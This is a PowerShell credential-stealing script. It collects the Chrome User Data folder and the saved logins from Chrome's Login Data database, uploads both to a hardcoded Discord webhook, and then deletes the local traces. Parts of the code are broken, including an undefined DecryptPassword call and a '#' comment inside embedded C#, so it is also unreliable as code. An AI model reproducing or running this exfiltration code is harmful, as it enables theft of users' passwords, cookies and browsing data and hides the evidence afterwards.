# Define the Discord Webhook URL
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function to create a zip file and return the path
function Create-ZipFile {
    param (
        [string]$chromePath,
        [string]$outputZip
    )
    
    # Get all files from Chrome User Data folder (skip files that are in use)
    $chromeFiles = Get-ChildItem "$chromePath" -Recurse | Where-Object { -not $_.PSIsContainer }
    $filesToAdd = @()

    foreach ($file in $chromeFiles) {
        try {
            # Check if the file is in use (locked by another process)
            $null = [System.IO.File]::OpenRead($file.FullName)
            $filesToAdd += $file.FullName
        } catch {
            Write-Host "Skipping file (in use): $($file.FullName)"
        }
    }

    if ($filesToAdd.Count -eq 0) {
        Send-DiscordMessage -message "No files to zip (all files are in use)."
        exit
    }

    # Create a zip of the Chrome User Data using Compress-Archive
    Compress-Archive -Path $filesToAdd -DestinationPath $outputZip
    if ($LASTEXITCODE -ne 0) {
        Send-DiscordMessage -message "Error creating zip file with Compress-Archive"
        exit
    }

    return $outputZip
}

# Function to extract passwords from Chrome's SQLite Login Data file
function Extract-ChromePasswords {
    param (
        [string]$loginDataPath
    )

    # Output text file for passwords
    $passwordFile = "$env:TEMP\chrome_passwords.txt"

    # Load SQLite assembly for extracting data
    Add-Type -TypeDefinition @"
    using System;
    using System.Data.SQLite;
    public class SQLiteHelper {
        public static string GetPasswords(string path) {
            using (var connection = new SQLiteConnection("Data Source=" + path)) {
                connection.Open();
                using (var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", connection)) {
                    var reader = cmd.ExecuteReader();
                    string passwords = "";
                    while (reader.Read()) {
                        var url = reader.GetString(0);
                        var username = reader.GetString(1);
                        var password = DecryptPassword(reader.GetString(2));  # Assuming you implement DecryptPassword
                        passwords += "URL: " + url + " Username: " + username + " Password: " + password + "`n";
                    }
                    return passwords;
                }
            }
        }
    }
"@

    # Call the function to extract passwords
    $passwords = [SQLiteHelper]::GetPasswords($loginDataPath)

    # Save the passwords to a .txt file
    Set-Content -Path $passwordFile -Value $passwords
    return $passwordFile
}

# Function to upload files to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        $LF,
        [System.Text.Encoding]::ASCII.GetString($fileBytes),
        "--$boundary--",
        $LF
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        # Send the file to Discord via webhook
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
        Write-Host "File uploaded successfully."
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    exit
}

# Define the path for the zip file
$outputZip = "$env:TEMP\chrome_data.zip"
$passwordFile = "$env:TEMP\chrome_passwords.txt"

# Create the zip file with Chrome User Data
$zipFile = Create-ZipFile -chromePath $chromePath -outputZip $outputZip

# Extract passwords and save to a text file
$loginDataPath = "$chromePath\Default\Login Data"
$passwordTxtFile = Extract-ChromePasswords -loginDataPath $loginDataPath

# Upload the zip file to Discord
Upload-FileToDiscord -filePath $zipFile

# Upload the passwords text file to Discord
Upload-FileToDiscord -filePath $passwordTxtFile

# Optionally, remove the files after uploading
Remove-Item $zipFile
Remove-Item $passwordTxtFile
